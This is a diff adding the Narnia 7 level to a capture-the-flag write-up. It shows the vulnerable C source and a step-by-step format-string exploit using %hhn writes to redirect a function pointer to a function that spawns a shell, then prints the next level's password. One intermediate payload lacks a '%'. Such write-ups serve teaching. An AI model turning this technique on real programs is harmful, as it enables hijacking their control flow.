@@ -574,3 +574,120 @@ YY4F9UaB60
 ```
 
 ![Get shell - Narnia 6](assets/narnia6-getshell.png)
+
+## Narnia 7
+
+```c
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <stdlib.h>
+#include <unistd.h>
+
+int goodfunction();
+int hackedfunction();
+
+int vuln(const char *format){
+        char buffer[128];
+        int (*ptrf)();
+
+        memset(buffer, 0, sizeof(buffer));
+        printf("goodfunction() = %p\n", goodfunction);
+        printf("hackedfunction() = %p\n\n", hackedfunction);
+
+        ptrf = goodfunction;
+        printf("before : ptrf() = %p (%p)\n", ptrf, &ptrf);
+
+        printf("I guess you want to come to the hackedfunction...\n");
+        sleep(2);
+        ptrf = goodfunction;
+
+        snprintf(buffer, sizeof buffer, format);
+
+        return ptrf();
+}
+
+int main(int argc, char **argv){
+        if (argc <= 1){
+                fprintf(stderr, "Usage: %s <buffer>\n", argv[0]);
+                exit(-1);
+        }
+        exit(vuln(argv[1]));
+}
+
+int goodfunction(){
+        printf("Welcome to the goodfunction, but i said the Hackedfunction..\n");
+        fflush(stdout);
+
+        return 0;
+}
+
+int hackedfunction(){
+        printf("Way to go!!!!");
+	    fflush(stdout);
+        setreuid(geteuid(),geteuid());
+        system("/bin/sh");
+
+        return 0;
+}
+```
+
+Narnia 7 is basically the same as narnia 5. We'll exploit `snprintf` again to
+change the value of `ptrf` to the address of `hackedfunction`.
+
+Let's have a quick test to see these addresses.
+
+```bash
+$ /narnia/narnia7 test
+goodfunction() = 0x80492fa
+hackedfunction() = 0x804931f
+
+before : ptrf() = 0x80492fa (0xffffd468)
+I guess you want to come to the hackedfunction...
+Welcome to the goodfunction, but i said the Hackedfunction..
+```
+
+We can see that higher two bytes of the addresses of `goodfunction` and
+`hackedfunction` are the same, so we can just change the lower two bytes in
+`ptrf` from `0x92fa` to `0x931f`.
+
+In order to do so, we can use `%hhn` to write the low 1 byte of `%n` to the
+target address.
+
+So the first part of our exploit string should be
+
+```bash
+`echo -e '\x68\xd4\xff\xff\x69\xd4\xff\xff'`
+```
+
+which specifies the addresses of the lower two bytes of `ptrf`. And now 
+`snprintf` will have written 8 bytes, and to get `0x1f` we need an extra
+23 bytes, so we can write `%23c`, and `\x68\xd4\xff\xff` will be the second
+arg to `snprintf`. Hence we write `%2$hhn`.
+
+```bash
+`echo -e '\x68\xd4\xff\xff\x69\xd4\xff\xff23c%2$hhn'`
+```
+
+Similarly, we can calculate the number of bytes we need to get `0x93`, and the
+result would be
+
+```bash
+`echo -e '\x68\xd4\xff\xff\x69\xd4\xff\xff23c%2$hhn%116c%3$hhn'`
+```
+
+However, notice that arguments passed to a program will also effect the
+positions of stack variables, so we need some minor changes to make it right.
+
+```bash
+$ /narnia/narnia7 `echo -e '\x48\xd4\xff\xff\x49\xd4\xff\xff%23c%2$hhn%116c%3$hhn'`
+goodfunction() = 0x80492fa
+hackedfunction() = 0x804931f
+
+before : ptrf() = 0x80492fa (0xffffd448)
+I guess you want to come to the hackedfunction...
+Way to go!!!!$ cat /etc/narnia_pass/narnia8
+1aBcDgPttG
+```
+
+![Get shell - Narnia 7](assets/narnia7.png)
